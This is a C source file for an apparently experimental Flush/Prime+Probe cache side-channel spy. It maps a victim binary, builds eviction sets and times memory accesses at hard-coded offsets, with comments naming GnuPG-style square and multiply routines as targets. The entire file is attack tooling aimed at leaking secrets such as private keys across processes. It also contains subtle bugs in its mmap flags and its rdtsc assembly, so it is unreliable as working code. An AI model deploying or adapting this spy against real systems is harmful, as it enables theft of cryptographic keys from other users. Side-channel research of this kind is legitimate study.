#include "evset-timings.c"
#include <sys/stat.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <x86intrin.h>
#include <errno.h>

static Node **spy_evsets = NULL;
static void *victim;
static void *victim_copy;
// static int map_len;
uint64_t *msrmts_spy;

void *map(char *file_name, uint64_t offset)
{
    int file_descriptor = open(file_name, O_RDONLY); 
    if (file_descriptor == -1) return NULL;
    struct stat st_buf;
    if (fstat(file_descriptor, &st_buf) == -1) return NULL;
    size_t map_len = st_buf.st_size;
    printf("debug size map_len %d\n", map_len);
	void *mapping = mmap(NULL, map_len, PROT_READ, MAP_SHARED | MAP_ANON | MAP_HUGETLB, file_descriptor, 0);
	if (mapping == MAP_FAILED){
		printf("[!] map: mmap fail with errno %d\n", errno); // fix problems with mmap
		return NULL;
	}
	close(file_descriptor);
	return (void *)(((uint64_t) mapping) + offset);  // mapping will be implicitly unmapped when calling function will be exited
}

// TODO load addresses from file

void init_spy(char *target_filepath, int offset_target){
    printf("[+] spy: init spy\n");
    // load victim 
    // victim_reader(target_filepath);
    victim = map(target_filepath, offset_target);
    victim_copy = map(target_filepath, offset_target);
    // printf("victim read\n");

    // prepare evset
    Config *spy_conf= config_init(24, 2048, 64, 106, 2097152, 1, 1);
    init_evset(spy_conf);
    printf("[+] spy: init evset done\n");
    spy_evsets = find_evset(spy_conf, victim);
    printf("[+] spy: find evset done\n");
    
    printf("[+] spy: print spy evset for target adrs %p\n", victim);
    list_print(spy_evsets);

    msrmts_spy = malloc(1000000*sizeof(uint64_t));
}

static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ ("rdtsc" : "=A" (x));
    return x;
}

void my_monitor(){
    int ctr =0, evset_probetime;
    unsigned long long old_tsc, tsc = rdtsc();
    probe_chase_loop(victim_copy, 1);
    probe_chase_loop(victim, 1);
    // probe_evset_chase(*spy_evsets);
    // probe_evset_chase(*spy_evsets);
    // void *my_victim = map("./build/victim", 0x11a8);

    flush(victim);
    flush(victim_copy);

    int timing1 = probe_chase_loop(victim, 1);
    int timing2 = probe_chase_loop(victim, 1);
    probe_evset_chase(victim);
    int timing3 = probe_chase_loop(victim_copy, 1);
    int timing4 = probe_chase_loop(victim, 1);

    printf("%d %d %d %d\n", timing1, timing2, timing3, timing4);
    // while(1)
    // {
    //     probe_chase_loop(victim_copy, 1);
    //     old_tsc = tsc;
    //     tsc=rdtsc();
    //     while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
    //     {
    //         tsc = rdtsc();
    //     }
    //     msrmts_spy[ctr]= probe_chase_loop(victim, 1);
    //     evset_probetime = probe_evset_chase(*spy_evsets);
    //     if(msrmts_spy[ctr] < conf->threshold) {
    //         printf("[!] my_monitor: victim acitivity detected! cycles %lu, ctr %d, evset_probetime %lu\n", msrmts_spy[ctr], ctr, evset_probetime);
    //     }
    //     ctr++;
    //     if(ctr >= 1000000) ctr=0;
    // }
    
    // for(int i=0;i<100000;i++) printf("%lu; ", msrmts_spy[i]);
    // printf("\n ctr %d \n", ctr);
}

void spy(char *victim_filepath, int offset_target){
    init_spy(victim_filepath, offset_target);
    printf("[+] spy: spy init complete, monitoring %p now...\n", victim);
    my_monitor();
}

int main(int ac, char **av){  
    // printf("%s\n", av[1]); // first char file path
    // printf("%s\n", av[2]); // second file path later, rn hardcoded location 
    // int my_target = 0x15cb;
    if(ac!=3) return 0;
    // int my_target = 0xd57ed; 
    int my_target = 0x118a;
    //0x116f-0x11b4 victim_loop2, loop itself 0x118a - 0x11a8, take 0x118a alder lake
    //0xd57ed madgpg sqr, 0xd571f mul
    // loop2 skylake 0x118a
    // my_access(my_target);
    // printf("%d\n", my_target);
    // printf("%p\n", target_loader(av[2]));
    spy(av[1], my_target);
}

//TODO warum 400 cycles in test, aber 1900 hier bei evset probe
// evtl target im L2 cache ?? was ist mit L1 timing? was mach ich dann?